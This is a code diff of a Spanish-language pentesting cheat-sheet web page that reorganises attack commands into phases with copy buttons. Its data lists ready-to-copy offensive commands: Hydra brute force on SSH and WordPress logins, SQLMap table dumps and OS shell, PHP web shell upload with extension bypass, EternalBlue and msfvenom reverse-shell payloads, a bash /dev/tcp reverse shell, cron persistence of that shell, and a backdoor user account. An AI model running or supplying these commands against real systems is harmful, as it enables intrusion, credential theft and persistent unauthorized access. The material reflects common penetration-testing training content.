-          { scenario: "Configurar exploit", command: "set RHOSTS 192.168.1.100\nset LHOST 192.168.1.50\nset payload windows/x64/meterpreter/reverse_tcp\nexploit", explanation: "RHOSTS: target | LHOST: tu IP" },
-          { scenario: "Escanear con módulo auxiliar", command: "use auxiliary/scanner/smb/smb_version\nset RHOSTS 192.168.1.0/24\nrun", explanation: "Identifica versión de SMB en la red" },
-          { scenario: "FTP anonymous login", command: "use auxiliary/scanner/ftp/anonymous\nset RHOSTS 192.168.1.100\nrun", explanation: "Verifica acceso anónimo FTP" },
-          { scenario: "Generar payload", command: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > shell.exe", explanation: "Crea ejecutable malicioso Windows" },
-          { scenario: "Handler para reverse shell", command: "use exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST 192.168.1.50\nexploit", explanation: "Listener para recibir conexiones inversas" }
+      {
+        phase: "Ataques de Contraseña",
+        description: "Fuerza bruta y cracking de contraseñas en servicios descubiertos.",
+        tools: [
+          {
+            name: "Hydra",
+            commands: [
+              { label: "SSH brute force", cmd: "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100", desc: "Ataque de fuerza bruta contra SSH" },
+              { label: "HTTP POST form", cmd: "hydra -l admin -P rockyou.txt 192.168.1.100 http-post-form '/login.php:username=^USER^&password=^PASS^:F=incorrect'", desc: "Ataque a formulario de login web" },
+              { label: "FTP", cmd: "hydra -L users.txt -P passwords.txt ftp://192.168.1.100", desc: "Fuerza bruta FTP con listas de usuarios y passwords" },
+              { label: "SMB", cmd: "hydra -l administrator -P rockyou.txt smb://192.168.1.100", desc: "Ataque SMB/Windows shares" }
+            ]
+          },
+          {
+            name: "Hydra para WordPress",
+            commands: [
+              { label: "wp-login.php", cmd: "hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=ERROR'", desc: "Fuerza bruta al panel de login de WordPress" },
+              { label: "xmlrpc.php", cmd: "hydra -l admin -P rockyou.txt 192.168.1.100 http-post-form '/xmlrpc.php:log=^USER^&pwd=^PASS^:F=403'", desc: "Ataque via xmlrpc (más rápido pero puede estar deshabilitado)" },
+              { label: "Con lista de usuarios", cmd: "hydra -L wp-users.txt -P rockyou.txt 192.168.1.100 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid'", desc: "Usa lista de usuarios enumerados previamente con WPScan" }
+            ]
+          },
+          {
+            name: "John the Ripper",
+            commands: [
+              { label: "Crackear hash", cmd: "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt", desc: "Crackea hashes con wordlist" },
+              { label: "Ver crackeados", cmd: "john --show hash.txt", desc: "Muestra passwords ya descubiertas" },
+              { label: "SSH key", cmd: "ssh2john id_rsa > ssh_hash.txt && john ssh_hash.txt", desc: "Crackea passphrase de llave SSH privada" },
+              { label: "ZIP protegido", cmd: "zip2john file.zip > zip_hash.txt && john zip_hash.txt", desc: "Extrae y crackea password de archivo ZIP" }
+            ]
+          }
         ]
       },
-      smbclient: {
-        title: "SMBClient / Enum4linux",
-        colorClass: "c-indigo",
-        category: "SMB",
-        examples: [
-          { scenario: "Listar shares disponibles", command: "smbclient -L //192.168.1.100 -N", explanation: "-L: listar | -N: sin password (null session)" },
-          { scenario: "Conectar a share específico", command: "smbclient //192.168.1.100/share_name -U username", explanation: "Conecta con usuario específico" },
-          { scenario: "Conectar como anonymous", command: "smbclient //192.168.1.100/share -U '' -N", explanation: "Usuario vacío y sin password" },
-          { scenario: "Enum4linux completo", command: "enum4linux -a 192.168.1.100", explanation: "-a: todo (users, shares, groups, policies)" },
-          { scenario: "Enum4linux solo usuarios", command: "enum4linux -U 192.168.1.100", explanation: "-U: enumera solo usuarios" },
-          { scenario: "SMBMap para permisos", command: "smbmap -H 192.168.1.100 -u guest", explanation: "Muestra shares y permisos de acceso" },
-          { scenario: "Descargar recursivamente", command: "smbget -R smb://192.168.1.100/share -U username", explanation: "-R: recursivo, descarga todo" }
+      {
+        phase: "Explotación Web",
+        description: "Explotar vulnerabilidades encontradas en aplicaciones web.",
+        tools: [
+          {
+            name: "SQLMap",
+            commands: [
+              { label: "Detectar SQLi", cmd: "sqlmap -u 'http://10.10.10.100/page.php?id=1' --batch", desc: "Detecta inyección SQL automáticamente" },
+              { label: "Listar bases de datos", cmd: "sqlmap -u 'http://10.10.10.100/page.php?id=1' --dbs", desc: "Enumera todas las bases de datos" },
+              { label: "Dumpear tabla", cmd: "sqlmap -u 'http://10.10.10.100/page.php?id=1' -D database -T users --dump", desc: "Extrae contenido de tabla específica" },
+              { label: "OS Shell", cmd: "sqlmap -u 'http://10.10.10.100/page.php?id=1' --os-shell", desc: "Intenta obtener shell del sistema operativo" },
+              { label: "POST request", cmd: "sqlmap -u 'http://10.10.10.100/login.php' --data='username=admin&password=test' -p username", desc: "SQLi en parámetros POST" }
+            ]
+          },
+          {
+            name: "XSS & File Upload",
+            commands: [
+              { label: "XSS básico", cmd: 'curl "http://dominio.com/page.php?name=<script>alert(1)</script>"', desc: "Prueba XSS reflejado simple" },
+              { label: "Upload PHP shell", cmd: "curl -F 'file=@shell.php' http://dominio.com/upload.php", desc: "Sube web shell PHP" },
+              { label: "Bypass extensión", cmd: "mv shell.php shell.php.jpg && curl -F 'file=@shell.php.jpg' http://dominio.com/upload.php", desc: "Intenta bypass de validación de extensión" }
+            ]
+          }
         ]
       },
-      nikto: {
-        title: "Nikto - Web Scanner",
-        colorClass: "c-yellow",
-        category: "Web",
-        examples: [
-          { scenario: "Escaneo básico", command: "nikto -h http://192.168.1.100", explanation: "-h: host/URL a escanear" },
-          { scenario: "Escaneo en puerto específico", command: "nikto -h 192.168.1.100 -p 8080", explanation: "-p: puerto personalizado" },
-          { scenario: "Con SSL/HTTPS", command: "nikto -h https://192.168.1.100 -ssl", explanation: "-ssl: fuerza conexión SSL" },
-          { scenario: "Guardar resultados", command: "nikto -h http://192.168.1.100 -o results.html -Format html", explanation: "-o: output | -Format: formato de salida" },
-          { scenario: "Con autenticación", command: "nikto -h http://192.168.1.100 -id admin:password", explanation: "-id: credenciales HTTP Basic Auth" }
+      {
+        phase: "Explotación con Metasploit",
+        description: "Usar Metasploit Framework para explotar servicios vulnerables.",
+        tools: [
+          {
+            name: "Metasploit",
+            commands: [
+              { label: "Iniciar MSF", cmd: "msfconsole", desc: "Inicia Metasploit Framework" },
+              { label: "Buscar exploit", cmd: "search eternalblue", desc: "Busca exploits disponibles" },
+              { label: "EternalBlue", cmd: "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.100\nset LHOST 192.168.1.50\nexploit", desc: "Explota vulnerabilidad EternalBlue en SMB" },
+              { label: "Reverse TCP handler", cmd: "use exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST 192.168.1.50\nexploit", desc: "Listener para recibir conexiones inversas" },
+              { label: "msfvenom payload", cmd: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > shell.exe", desc: "Genera payload ejecutable de Windows" }
+            ]
+          },
+          {
+            name: "Searchsploit",
+            commands: [
+              { label: "Buscar exploit", cmd: "searchsploit apache 2.4.49", desc: "Busca exploits para software específico" },
+              { label: "Ver código", cmd: "searchsploit -x 49584", desc: "Muestra el código del exploit" },
+              { label: "Copiar exploit", cmd: "searchsploit -m 49584", desc: "Copia exploit al directorio actual" },
+              { label: "Actualizar DB", cmd: "searchsploit -u", desc: "Actualiza base de datos de exploits" }
+            ]
+          }
         ]
       },
-      netcat: {
-        title: "Netcat (nc) - Swiss Army Knife",
-        colorClass: "c-gray",
-        category: "Networking",
-        examples: [
-          { scenario: "Banner grabbing", command: "nc 192.168.1.100 80", explanation: "Conecta al puerto y muestra banner" },
-          { scenario: "Listener para reverse shell", command: "nc -lvnp 4444", explanation: "-l: listen | -v: verbose | -n: no DNS | -p: puerto" },
-          { scenario: "Transferir archivo", command: "# Receptor:\nnc -lvnp 4444 > file.txt\n# Emisor:\nnc 192.168.1.100 4444 < file.txt", explanation: "Envía archivos entre máquinas" },
-          { scenario: "Reverse shell (víctima)", command: "nc 192.168.1.50 4444 -e /bin/bash", explanation: "-e: ejecuta comando (bash shell)" },
-          { scenario: "Bind shell (atacante)", command: "nc 192.168.1.100 4444", explanation: "Conecta a bind shell en víctima" },
-          { scenario: "Escaneo de puertos simple", command: "nc -zv 192.168.1.100 1-1000", explanation: "-z: zero I/O mode | escanea puertos 1-1000" }
-        ]
-      },
-      johntheripper: {
-        title: "John the Ripper - Password Cracking",
-        colorClass: "c-reddark",
-        category: "Password Attack",
-        examples: [
-          { scenario: "Crackear hash básico", command: "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt", explanation: "Usa wordlist para crackear hashes" },
-          { scenario: "Ver passwords crackeadas", command: "john --show hash.txt", explanation: "Muestra passwords ya descubiertas" },
-          { scenario: "Hash de /etc/shadow", command: "unshadow /etc/passwd /etc/shadow > unshadowed.txt\njohn unshadowed.txt", explanation: "Combina passwd y shadow para crackear" },
-          { scenario: "SSH private key", command: "ssh2john id_rsa > ssh_hash.txt\njohn --wordlist=rockyou.txt ssh_hash.txt", explanation: "Convierte llave SSH y crackea passphrase" },
-          { scenario: "ZIP protegido", command: "zip2john file.zip > zip_hash.txt\njohn zip_hash.txt", explanation: "Extrae hash de ZIP y lo crackea" },
-          { scenario: "Formato específico", command: "john --format=NT hash.txt", explanation: "Especifica formato de hash (NT, MD5, SHA, etc)" }
-        ]
-      },
-      searchsploit: {
-        title: "Searchsploit - Exploit Database",
-        colorClass: "c-pink",
-        category: "Explotación",
-        examples: [
-          { scenario: "Buscar exploits por software", command: "searchsploit apache 2.4.49", explanation: "Busca exploits para Apache versión 2.4.49" },
-          { scenario: "Búsqueda exacta", command: "searchsploit -t vsftpd 2.3.4", explanation: "-t: búsqueda por título exacto" },
-          { scenario: "Ver código del exploit", command: "searchsploit -x 49584", explanation: "-x: examina/muestra el código del exploit" },
-          { scenario: "Copiar exploit al directorio", command: "searchsploit -m 49584", explanation: "-m: mirror/copia exploit al directorio actual" },
-          { scenario: "Buscar por plataforma", command: "searchsploit --platform windows kernel", explanation: "Filtra por sistema operativo" },
-          { scenario: "Actualizar base de datos", command: "searchsploit -u", explanation: "Actualiza la base de datos local de exploits" }
+      {
+        phase: "Post-Explotación",
+        description: "Mantener acceso, elevar privilegios y moverse lateralmente en la red.",
+        tools: [
+          {
+            name: "Netcat & Shells",
+            commands: [
+              { label: "Listener", cmd: "nc -lvnp 4444", desc: "Listener para recibir reverse shell" },
+              { label: "Reverse shell bash", cmd: "bash -i >& /dev/tcp/192.168.1.50/4444 0>&1", desc: "Reverse shell usando bash (ejecutar en víctima)" },
+              { label: "Python TTY", cmd: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", desc: "Mejora shell a TTY interactivo" },
+              { label: "Transferir archivo", cmd: "# Receptor: nc -lvnp 4444 > file.txt\n# Emisor: nc 192.168.1.100 4444 < file.txt", desc: "Transfiere archivos entre máquinas" }
+            ]
+          },
+          {
+            name: "Escalación de Privilegios",
+            commands: [
+              { label: "SUID binarios", cmd: "find / -perm -4000 2>/dev/null", desc: "Busca binarios con bit SUID (potencial privesc)" },
+              { label: "Sudo permisos", cmd: "sudo -l", desc: "Lista comandos que el usuario puede ejecutar con sudo" },
+              { label: "LinPEAS", cmd: "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh", desc: "Script automático de enumeración para Linux" },
+              { label: "Capabilities", cmd: "getcap -r / 2>/dev/null", desc: "Lista capabilities de archivos (puede permitir privesc)" }
+            ]
+          },
+          {
+            name: "Pivoting & Port Forwarding",
+            commands: [
+              { label: "SSH Local Forward", cmd: "ssh -L 8080:localhost:80 user@192.168.1.100", desc: "Redirige puerto local 8080 al puerto 80 del servidor remoto" },
+              { label: "SSH Remote Forward", cmd: "ssh -R 8080:localhost:80 user@192.168.1.100", desc: "Expone puerto local 80 en el puerto 8080 del servidor remoto" },
+              { label: "SSH Dynamic (SOCKS)", cmd: "ssh -D 9050 user@192.168.1.100", desc: "Crea proxy SOCKS en puerto 9050 para tunelizar tráfico" },
+              { label: "ProxyChains", cmd: "# Editar /etc/proxychains.conf: socks5 127.0.0.1 9050\nproxychains nmap -sT 10.10.10.0/24", desc: "Usa proxy SOCKS para escanear red interna" },
+              { label: "Chisel Server", cmd: "chisel server -p 8080 --reverse", desc: "Inicia servidor Chisel para tunneling" },
+              { label: "Chisel Client", cmd: "chisel client 192.168.1.50:8080 R:8001:localhost:8001", desc: "Cliente Chisel que redirige puertos" },
+              { label: "SSHuttle VPN", cmd: "sshuttle -r user@192.168.1.100 10.10.10.0/24", desc: "Crea VPN sobre SSH para acceder a red interna completa" }
+            ]
+          },
+          {
+            name: "Persistencia",
+            commands: [
+              { label: "Cron job", cmd: "echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/192.168.1.50/4444 0>&1\"' | crontab -", desc: "Añade reverse shell a crontab para ejecución periódica" },
+              { label: "SSH Key", cmd: "ssh-keygen -t rsa\ncat ~/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys", desc: "Añade tu clave SSH para acceso persistente" },
+              { label: "Backdoor usuario", cmd: "useradd -m -s /bin/bash backdoor && echo 'backdoor:password123' | chpasswd", desc: "Crea usuario backdoor con contraseña" }
+            ]
+          }
         ]
       }
-    };
+    ];
 
-    // ======= Construir UI ========
-    const main = document.getElementById('main');
+    const roadmap = document.getElementById('roadmap');
 
-    // categorizar
-    const categories = [...new Set(Object.values(tools).map(t => t.category))];
+    methodology.forEach((phase, idx) => {
+      const phaseDiv = document.createElement('div');
+      phaseDiv.className = 'phase';
 
-    function createIcon(name){
-      // Iconos SVG simples (minimalistas)
-      const svgNS = 'http://www.w3.org/2000/svg';
-      const svg = document.createElementNS(svgNS,'svg');
-      svg.setAttribute('width','24');
-      svg.setAttribute('height','24');
-      svg.setAttribute('viewBox','0 0 24 24');
-      svg.setAttribute('aria-hidden','true');
-      const path = document.createElementNS(svgNS,'path');
-      path.setAttribute('fill','currentColor');
-      // simple shapes per name
-      const shapes = {
-        search: "M21 21l-4.35-4.35M10.5 18a7.5 7.5 0 1 1 0-15 7.5 7.5 0 0 1 0 15z",
-        globe: "M12 2a10 10 0 1 0 0 20 10 10 0 0 0 0-20z",
-        lock: "M6 10V8a6 6 0 0 1 12 0v2h1a1 1 0 0 1 1 1v9a1 1 0 0 1-1 1H5a1 1 0 0 1-1-1v-9a1 1 0 0 1 1-1h1z",
-        db: "M12 2C7.03 2 3 3.79 3 6v12c0 2.21 4.03 4 9 4s9-1.79 9-4V6c0-2.21-4.03-4-9-4z",
-        term: "M4 6h16M4 12h16M4 18h16",
-        shield: "M12 2l7 4v6c0 5-3.58 9.74-7 10-3.42-.26-7-5-7-10V6l7-4z",
-        server: "M3 5h18v6H3zM3 13h18v6H3z",
-        code: "M8.12 12.12 3 7l1.4-1.4L9.52 12 4.4 17.4 3 16z M15.88 12.12 20 7l-1.4-1.4L14.48 12l4.12 4.4L20 15z"
-      };
-      path.setAttribute('d', shapes[name] || shapes.search);
-      svg.appendChild(path);
-      return svg;
-    }
+      const header = document.createElement('div');
+      header.className = 'phase-header';
+      header.innerHTML = `
+        <div class="phase-number">${idx + 1}</div>
+        <div class="phase-title">${phase.phase}</div>
+        <div class="phase-toggle">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M6 9l6 6 6-6"/>
+          </svg>
+        </div>
+      `;
 
-    function build(){
-      categories.forEach(cat => {
-        const section = document.createElement('section');
-        section.className = 'category';
-        const h2 = document.createElement('h2');
-        h2.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" style="opacity:.9"><path d="M9 18l6-6-6-6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>' + cat;
-        section.appendChild(h2);
+      header.addEventListener('click', () => {
+        phaseDiv.classList.toggle('open');
+      });
 
-        const toolKeys = Object.keys(tools).filter(k => tools[k].category === cat);
-        toolKeys.forEach(key => {
-          const data = tools[key];
-          const card = document.createElement('div');
-          card.className = 'tool-card';
+      const desc = document.createElement('div');
+      desc.className = 'phase-desc';
+      desc.textContent = phase.description;
 
-          // button
-          const btn = document.createElement('button');
-          btn.className = 'tool-btn ' + (data.colorClass || '');
-          btn.setAttribute('aria-expanded','false');
-          btn.setAttribute('type','button');
+      const toolsGrid = document.createElement('div');
+      toolsGrid.className = 'tools-grid';
 
-          const left = document.createElement('div'); left.className='tool-left';
-          const iconWrap = document.createElement('div');
-          iconWrap.style.display='inline-flex';
-          iconWrap.style.alignItems='center';
-          iconWrap.style.justifyContent='center';
-          iconWrap.style.width='38px';
-          iconWrap.style.height='38px';
-          iconWrap.style.borderRadius='8px';
-          iconWrap.style.background='rgba(255,255,255,.06)';
-          iconWrap.style.flex='0 0 38px';
-          // choose icon by key heuristics
-          const iconName = key.includes('nmap')? 'search' : key.includes('gobuster')? 'globe' : key.includes('hydra')||key.includes('john')? 'lock' : key.includes('sqlmap')? 'db' : key.includes('metasploit')? 'shield' : key.includes('smb')? 'server' : key.includes('nikto')? 'globe' : key.includes('netcat')? 'term' : 'code';
-          iconWrap.appendChild(createIcon(iconName));
-          left.appendChild(iconWrap);
+      phase.tools.forEach(tool => {
+        const toolCard = document.createElement('div');
+        toolCard.className = 'tool-card';
 
-          const meta = document.createElement('div'); meta.className='tool-meta';
-          const ttitle = document.createElement('div'); ttitle.className='tool-title'; ttitle.textContent = data.title;
-          const tcat = document.createElement('div'); tcat.className='tool-category'; tcat.textContent = data.category;
-          meta.appendChild(ttitle); meta.appendChild(tcat);
-          left.appendChild(meta);
+        toolCard.innerHTML = `
+          <div class="tool-header">
+            <div class="tool-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M10 2h4v2h-4zM3 8h18v2H3zM7 13h10v2H7zM11 18h2v2h-2z"/>
+              </svg>
+            </div>
+            <div class="tool-name">${tool.name}</div>
+          </div>
+        `;
 
-          const chev = document.createElement('div');
-          chev.className = 'chev';
-          chev.innerHTML = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M9 18l6-6-6-6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>';
+        const commandsDiv = document.createElement('div');
+        commandsDiv.className = 'commands';
 
-          btn.appendChild(left);
-          btn.appendChild(chev);
-          card.appendChild(btn);
-
-          // examples container (hidden by default)
-          const exContainer = document.createElement('div');
-          exContainer.className = 'examples';
-          exContainer.style.display = 'none';
-
-          data.examples.forEach((ex, idx) => {
-            const exEl = document.createElement('div'); exEl.className = 'example';
-
-            const head = document.createElement('div'); head.className = 'ex-head';
-            const num = document.createElement('div'); num.className='ex-num'; num.textContent = idx+1;
-            const title = document.createElement('div'); title.className='ex-title'; title.textContent = ex.scenario;
-            head.appendChild(num); head.appendChild(title);
-
-            const cmd = document.createElement('pre');
-            cmd.className='cmd';
-            // format lines: prefix $ unless line starts with #
-            const lines = ex.command.split('\\n');
-            // build HTML content safely
-            cmd.innerHTML = lines.map(line => {
-              if(line.trim().startsWith('#')){
-                return '<div class="comment">'+escapeHtml(line)+'</div>';
-              } else {
-                return '<div><span class="prompt">$</span>' + escapeHtml(line) + '</div>';
-              }
-            }).join('');
-            const expl = document.createElement('div'); expl.className='ex-expl';
-            expl.innerHTML = '<span>💡</span><div>'+escapeHtml(ex.explanation)+'</div>';
-
-            exEl.appendChild(head);
-            exEl.appendChild(cmd);
-            exEl.appendChild(expl);
-            exContainer.appendChild(exEl);
-          });
-
-          // toggle logic
-          btn.addEventListener('click', () => {
-            const opened = exContainer.style.display !== 'none';
-            if(opened){
-              exContainer.style.display = 'none';
-              btn.setAttribute('aria-expanded','false');
-              chev.classList.remove('rot');
-            } else {
-              exContainer.style.display = 'grid';
-              btn.setAttribute('aria-expanded','true');
-              chev.classList.add('rot');
-              // scroll into view a bit for mobile
-              setTimeout(()=> { card.scrollIntoView({behavior:'smooth', block:'center'}); }, 120);
-            }
-          });
-
-          card.appendChild(exContainer);
-          section.appendChild(card);
+        tool.commands.forEach(cmd => {
+          const cmdBlock = document.createElement('div');
+          cmdBlock.className = 'cmd-block';
+          cmdBlock.innerHTML = `
+            <div class="cmd-header">
+              <div class="cmd-label">${cmd.label}</div>
+              <button class="copy-btn" data-cmd="${escapeHtml(cmd.cmd)}">COPIAR</button>
+            </div>
+            <div class="cmd-code">${formatCommand(cmd.cmd)}</div>
+            <div class="cmd-expl">
+              <span>💡</span>
+              <div>${cmd.desc}</div>
+            </div>
+          `;
+          commandsDiv.appendChild(cmdBlock);
         });
 
-        main.appendChild(section);
+        toolCard.appendChild(commandsDiv);
+        toolCard.addEventListener('click', (e) => {
+          if (!e.target.classList.contains('copy-btn')) {
+            toolCard.classList.toggle('expanded');
+          }
+        });
+
+        toolsGrid.appendChild(toolCard);
       });
+
+      phaseDiv.appendChild(header);
+      phaseDiv.appendChild(desc);
+      phaseDiv.appendChild(toolsGrid);
+      roadmap.appendChild(phaseDiv);
+    });
+
+    // Copy functionality
+    document.addEventListener('click', (e) => {
+      if (e.target.classList.contains('copy-btn')) {
+        const cmd = e.target.getAttribute('data-cmd');
+        navigator.clipboard.writeText(cmd).then(() => {
+          const original = e.target.textContent;
+          e.target.textContent = 'COPIADO!';
+          e.target.classList.add('copied');
+          setTimeout(() => {
+            e.target.textContent = original;
+            e.target.classList.remove('copied');
+          }, 2000);
+        });
+      }
+    });
+
+    function escapeHtml(text) {
+      const div = document.createElement('div');
+      div.textContent = text;
+      return div.innerHTML;
     }
 
-    // helper to escape HTML
-    function escapeHtml(s){
-      return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+    function formatCommand(cmd) {
+      return cmd.split('\n').map(line => {
+        if (line.trim().startsWith('#')) {
+          return `<div class="comment">${escapeHtml(line)}</div>`;
+        }
+        return `<div>${escapeHtml(line)}</div>`;
+      }).join('');
     }
-
-    // Start
-    build();
-
   </script>
 </body>
 </html>
